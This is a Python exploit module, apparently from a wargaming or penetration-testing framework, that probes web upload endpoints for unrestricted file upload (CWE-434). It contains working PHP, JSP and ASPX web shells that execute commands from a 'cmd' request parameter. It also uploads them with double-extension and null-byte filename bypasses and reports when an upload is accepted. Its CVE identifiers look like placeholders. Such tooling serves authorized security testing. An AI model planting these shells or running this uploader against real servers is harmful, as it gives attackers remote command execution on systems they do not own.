"""
File Upload Exploit (CWE-434) - Unrestricted file upload attack.

Tests for file upload vulnerabilities allowing malicious file types.

Author: MAXIMUS Wargaming Team
Date: 2025-10-11
"""

import asyncio
import httpx
import time
from typing import Dict, Optional
from io import BytesIO

from exploit_database import ExploitResult, ExploitStatus, ExploitCategory


# Exploit Metadata
EXPLOIT_ID = "cwe_434_file_upload"
NAME = "Unrestricted File Upload"
DESCRIPTION = "Tests for missing file type validation on upload endpoints"
CATEGORY = "file_upload"
CWE_IDS = ["CWE-434"]
CVE_EXAMPLES = [
    "CVE-2024-UPLOAD-001",
    "CVE-2023-UPLOAD-789",
]


# Malicious file payloads
MALICIOUS_PAYLOADS = {
    "php_shell": {
        "filename": "shell.php",
        "content": b"<?php system($_GET['cmd']); ?>",
        "content_type": "application/x-php",
    },
    "jsp_shell": {
        "filename": "shell.jsp",
        "content": b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
        "content_type": "application/x-jsp",
    },
    "aspx_shell": {
        "filename": "shell.aspx",
        "content": b"<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(Request[\"cmd\"]); %>",
        "content_type": "application/x-aspx",
    },
    "double_extension": {
        "filename": "image.jpg.php",
        "content": b"<?php phpinfo(); ?>",
        "content_type": "image/jpeg",
    },
    "null_byte": {
        "filename": "shell.php\x00.jpg",
        "content": b"<?php phpinfo(); ?>",
        "content_type": "image/jpeg",
    },
}


async def execute(
    target_url: str,
    timeout: int = 30,
    **kwargs
) -> ExploitResult:
    """
    Execute file upload exploit.
    
    Args:
        target_url: Target upload endpoint (e.g., "http://localhost:8080/api/upload")
        timeout: Max execution time in seconds
        **kwargs: Additional parameters (file_param_name, etc)
    
    Returns:
        ExploitResult with success=True if malicious file upload succeeded
    
    Strategy:
        1. Attempt upload of PHP/JSP/ASPX shell
        2. Try double extension bypass (image.jpg.php)
        3. Try null byte injection (shell.php\0.jpg)
        4. Check if uploaded file is accessible/executable
    
    Example:
        >>> result = await execute("http://vuln-app/api/upload")
    """
    start_time = time.time()
    output_lines = []
    
    try:
        file_param_name = kwargs.get("file_param_name", "file")
        
        output_lines.append(f"Testing file upload on: {target_url}")
        
        async with httpx.AsyncClient(timeout=timeout, follow_redirects=True) as client:
            # Test each payload
            for payload_name, payload_data in MALICIOUS_PAYLOADS.items():
                output_lines.append(f"\n[Test] Uploading: {payload_data['filename']}")
                
                try:
                    # Prepare multipart form data
                    files = {
                        file_param_name: (
                            payload_data['filename'],
                            BytesIO(payload_data['content']),
                            payload_data['content_type']
                        )
                    }
                    
                    response = await client.post(target_url, files=files)
                    
                    output_lines.append(f"Response status: {response.status_code}")
                    
                    # Success indicators
                    if response.status_code in [200, 201]:
                        output_lines.append(f"✓ Upload succeeded: {payload_data['filename']}")
                        
                        # Check response for upload confirmation
                        response_text = response.text.lower()
                        
                        # Look for success indicators
                        success_indicators = [
                            "success",
                            "uploaded",
                            "saved",
                            payload_data['filename'].lower(),
                        ]
                        
                        if any(indicator in response_text for indicator in success_indicators):
                            output_lines.append("✓ Upload confirmed in response")
                            output_lines.append("✓ FILE UPLOAD VULNERABILITY CONFIRMED")
                            
                            duration = time.time() - start_time
                            
                            return ExploitResult(
                                exploit_id=EXPLOIT_ID,
                                category=ExploitCategory.FILE_UPLOAD,
                                status=ExploitStatus.SUCCESS,
                                success=True,
                                output="\n".join(output_lines),
                                error=None,
                                duration_seconds=duration,
                                metadata={
                                    "payload_used": payload_name,
                                    "filename": payload_data['filename'],
                                    "status_code": response.status_code,
                                }
                            )
                    
                    elif response.status_code in [403, 415, 400]:
                        output_lines.append(f"✗ Upload blocked: {response.status_code}")
                    
                    else:
                        output_lines.append(f"? Unexpected status: {response.status_code}")
                
                except httpx.HTTPError as e:
                    output_lines.append(f"HTTP error for {payload_name}: {e}")
                    continue
            
            # All payloads failed
            output_lines.append("\n✗ All malicious upload attempts blocked")
            output_lines.append("✗ File upload protection appears effective")
            
            duration = time.time() - start_time
            
            return ExploitResult(
                exploit_id=EXPLOIT_ID,
                category=ExploitCategory.FILE_UPLOAD,
                status=ExploitStatus.FAILED,
                success=False,
                output="\n".join(output_lines),
                error=None,
                duration_seconds=duration,
                metadata={"payloads_tested": len(MALICIOUS_PAYLOADS)}
            )
    
    except asyncio.TimeoutError:
        output_lines.append("✗ Exploit timeout")
        
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory.FILE_UPLOAD,
            status=ExploitStatus.TIMEOUT,
            success=False,
            output="\n".join(output_lines),
            error=f"Timeout after {timeout}s",
            duration_seconds=timeout,
            metadata={}
        )
    
    except Exception as e:
        output_lines.append(f"✗ Exploit error: {e}")
        
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory.FILE_UPLOAD,
            status=ExploitStatus.ERROR,
            success=False,
            output="\n".join(output_lines),
            error=str(e),
            duration_seconds=time.time() - start_time,
            metadata={}
        )


# Convenience function
async def test_file_upload(target_url: str) -> bool:
    """
    Quick file upload vulnerability test.
    
    Returns:
        True if vulnerable to malicious file upload
    
    Example:
        >>> vulnerable = await test_file_upload("http://localhost:8080/api/upload")
    """
    result = await execute(target_url)
    return result.success
